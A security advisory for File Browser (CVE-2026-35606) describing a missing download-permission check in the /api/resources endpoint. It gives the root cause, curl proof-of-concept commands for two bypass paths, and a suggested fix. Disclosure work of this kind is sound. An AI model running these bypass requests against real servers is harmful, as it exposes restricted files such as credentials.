# [M] File Browser discloses text file content via /api/resources endpoint bypassing Perm.Download check

## Summary
Severity: Medium
Advisory: GHSA-67cg-cpj7-qgc9
CVE: CVE-2026-35606
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-67cg-cpj7-qgc9
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.1

## Details
## Summary

The `resourceGetHandler` in `http/resource.go` returns full text file content without checking the `Perm.Download` permission flag. All three other content-serving endpoints (`/api/raw`, `/api/preview`, `/api/subtitle`) correctly verify this permission before serving content. A user with `download: false` can read any text file within their scope through two bypass paths.

Confirmed on v2.62.2 (commit 860c19d).

## Root Cause

`http/resource.go` line 26-33 hardcodes `Content: true` in the FileOptions without checking download permission:

    file, err := files.NewFileInfo(&files.FileOptions{
        ...
        Content:    true,  // Always loads text content, no permission check
    })

Lines 44-63: the `X-Encoding: true` header path reads the entire file and returns raw bytes as `application/octet-stream`, also without any download check.

Compare with the three protected endpoints:

    // raw.go:83-85
    if !d.user.Perm.Download { return http.StatusAccepted, nil }

    // preview.go:38-40
    if !d.user.Perm.Download { return http.StatusAccepted, nil }

    // subtitle.go:13-15
    if !d.user.Perm.Download { return http.StatusAccepted, nil }

## PoC

Tested on filebrowser v2.62.2, built from HEAD.

    # Create user with download=false via CLI
    filebrowser users add restricted testuser123456 --perm.download=false

    # Login
    TOKEN=$(curl -s http://HOST/api/login -d '{"username":"restricted","password":"testuser123456"}')

    # BLOCKED: /api/raw correctly enforces download permission
    curl -s -w "\nHTTP: %{http_code}" http://HOST/api/raw/secret.txt -H "X-Auth: $TOKEN"
    # → 202 Accepted (empty body)

    # BYPASS 1: /api/resources with X-Encoding returns raw file content
    curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" -H "X-Encoding: true"
    # → 200 OK, body: SECRET_PASSWORD=hunter2

    # BYPASS 2: /api/resources JSON includes content field
    curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" | jq .content
    # → "SECRET_PASSWORD=hunter2\n"

## Impact

A user with `download: false` can read the full content of text files within their authorized scope (up to the 10MB `detectType` limit). This includes source code, configuration files, credentials, and API tokens stored as text.

This bypass does not defeat path authorization. It bypasses only the `Download` permission for files the user can otherwise address within their authorized scope. The inconsistency across the four content-serving endpoints (three check `Perm.Download`, one does not) indicates this is an oversight, not a design decision.

## Suggested Fix

Match the existing endpoint behavior (HTTP 202 for denied downloads):

    Content: d.user.Perm.Download,  // Only load content when permitted

And add a guard before the X-Encoding raw byte path, matching the existing 202 pattern:

    if !d.user.Perm.Download {
        return http.StatusAccepted, nil
    }

---

**Update:** Fix submitted as PR #5891.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-67cg-cpj7-qgc9
- https://nvd.nist.gov/vuln/detail/CVE-2026-35606
- https://github.com/filebrowser/filebrowser
